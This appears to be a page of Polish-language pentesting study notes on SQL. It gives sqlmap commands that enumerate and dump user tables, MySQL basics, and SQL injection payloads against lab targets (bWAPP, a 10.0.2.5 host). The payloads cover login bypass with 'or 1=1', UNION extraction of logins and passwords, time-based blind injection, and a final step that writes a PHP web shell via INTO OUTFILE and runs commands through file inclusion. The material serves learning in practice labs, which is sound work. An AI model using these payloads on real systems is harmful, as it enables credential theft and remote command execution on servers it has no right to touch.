---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# sql

**SQLMAP**

{% code overflow="wrap" fullWidth="true" %}
```sql
sqlmap -u "https://hack-yourself-first.com/CarsByCylinders?Cylinders=V8" --dbs

sqlmap -r data.txt

#Enumeracja baz:
sqlmap -u "https://hack-yourself-first.com/CarsByCylinders?Cylinders=V8" --dbs

#Enumeracja tabel bazy:
sqlmap -u "https://hack-yourself-first.com/CarsByCylinders?Cylinders=V8" -D bWAPP --tables
    
#Enumeracja Kolumn tabeli:
sqlmap -u "https://hack-yourself-first.com/CarsByCylinders?Cylinders=V8" -D bWAPP -T users --columns
    
#Dump określonych kolumn tabeli users:
sqlmap -u "https://hack-yourself-first.com/CarsByCylinders?Cylinders=V8" -D bWAPP -T users -c login.password.admin --dump
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```sql
sudo service mysql start
sudo mysql -u root

CREATE USER 'michal'@'localhost' IDENTIFIED BY 'password';
## każde polecenie kończymy średnikiem!!

#Login -p should be empty (bash history), type password without space 
mysql -u [user] -p [nazwa bazy]

# Sprawdzamy dostępne bazy danych
show databases;
# Przeskakujemy do bazy danych 
use employees;
# Sprawdzamy jakie mamy dostęne tabele
show tables;
# Sprawdzamy jakie są nagłówki wierszy i typy danych.
describe employees;
# Wybieramy wszystkie imiona zaczynające się na Bar
select * from employees WHERE first_name LIKE 'Bar%';
# Wybiera użytkowników których identyfikator jest większy niż 1 oraz nazwa użytkownika nie jest równa john.
SELECT * FROM logins WHERE username != 'john' AND id > 1;
# Wyszukuje wskazany ciąg znaków
select * from <table> where <column> = "<string>";
CREATE TABLE products( id int(6) unsigned auto_increment primary key, product_name varchar(20) not null, product_price float(10,2) not null);


INSERT INTO products (product_name,product_price) VALUES ("Jajka",10);

CREATE DATABASE cyber;
use cyber;

create table blackhacker( id int(4) auto_increment primary key, username varchar(30) not null, password varchar(30) not null, country varchar(10) not null, rank varchar(30));

INSERT INTO blackhacker (username,password,country,rank) VALUES ("Rumcajs", "Balbina2022", "PL", "PRO");

SELECT * FROM whitehacker UNION SELECT * FROM blackhacker;

SELECT * FROM blackhacker UNION SELECT schema_name FROM information_schema.schemata;

SELECT * FROM information_schema.SESSION_STATUS;

SELECT Username,Rank FROM blackhacker WHERE country LIKE "pl" or 1=1 ORDER BY 1 DESC;

SELECT Username,Rank FROM blackhacker UNION SELECT rank,password FROM whitehacker;

SELECT Username,Rank FROM blackhacker INTO OUTFILE "/tmp/black.txt";

UPDATE blackhacker SET Rank="Elite" WHERE id=5;

SELECT product_name, product_price FROM products WHERE product _name LIKE "Jajka" AND substring(version(), 1,1)=5;
SELECT product_name, product_price FROM products WHERE product _name LIKE "Jajka" AND substring(version(), 1,3)=504;

SHOW variables LIKE "%general_log%";

SET global general_log='ON';

SELECT * FROM information_schema.schemata;   ===  show databases;
SELECT SCHEMA_NAME FROM SCHEMATA;

#jak korzystamy z UNION to tabele które łączymy muszą mieć tyle samo kolumn - jak trzeba to dopisujemy np. 1 żeby stworzyć dodatkowe dane w kolumnach
SELECT * FROM blackhacker UNION SELECT schema_name, '1', '1' FROM information_schema.schemata;

#wylistowanie wszystkich wpisów pomimo, że nie znamy żadnego
SELECT Username, Rank FROM blackhacker WHERE username="tratatata" or 1=1 ;- - -";
```
{% endcode %}

**SQL Injection**

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (29).jpg" alt=""><figcaption></figcaption></figure>

</div>

{% code fullWidth="true" %}
```sql
SELECT * FROM users WHERE user='user' and password='password'

#żeby wywołać błąd dodajemy ' i patrzymy czy jest baza danych i jaka
10.0.2.5/cat.php?id=2'

'#żeby zobaczyć wersję mysql
10.0.2.5/cat.php?id=2 and extractvalue(1, concat("!", version())) = 1

#wyświetlanie całej bazy
10.0.2.5/ cat.php?id=2 or 1=1

SELECT * FROM users WHERE login='bee' and password='bug';
SELECT * FROM users WHERE login='bee' or 1=1 - --'

czyli w oknie do logowania mogę wpisać
bee' or 1=1 - --

#korzystanie z UNION
10.0.2.5/cat.php?id=2 UNION SELECT 1,2,3,4

10.0.2.5/cat.php?id=1 UNION SELECT 1, table_name,3,4 FROM information_schema.tables WHERE table_schema=database()

10.0.2.5/cat.php?id=1 UNION SELECT 1, column_name,3,4 FROM information_schema.columns WHERE table_name="users"

10.0.2.5/cat.php?id=1 UNION SELECT 1,CONCAT(login,':'password),3,4 FROM users

#Time Based SQL injection - usypia server na 3 milisekundy gdy wszystko co jest wcześniej jest true
10.0.2.5/cat.php?id=2 and if(substring(version(),1,1)=5,sleep(3),0)

iron man' and substring(database(),1,1)="b" and sleep(3) -- -
```
{% endcode %}

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (30).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/2 (11).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/3 (4).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/4 (3).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/5 (1).jpg" alt=""><figcaption></figcaption></figure>

</div>

* Okreslenie liczby kolumn
* Okreslenie kolumn wyswietlajacych dane
* Okreslenie tabel w bazie
* Okreslenie kolumn dla danej tabeli
* Pobranie danych z tabeli

{% code fullWidth="true" %}
```sql
Iron man' ORDER BY 7-- -

1' UNION SELECT 1,2,3,4,5,6,7 -- -

1' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database() -- -

1' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name="users" -- -

1' UNION SELECT 1,login,password,secret,email,6,7 FROM users  -- -

1' UNION SELECT 1,group_concat(login,':',password,':',secret,':',email,':',admin),3,4,5,6,7 FROM users -- -

RCE:
0' UNION SELECT 1,"<?php system($_GET['cmd']);?>",3,4,5,6,7 INTO OUTFILE '/tmp/cmd.php' -- -
127.0.0.1/rlfi.php?lanquage=/tmp/cmd.php&action=go8cmd=Is -la
```
{% endcode %}
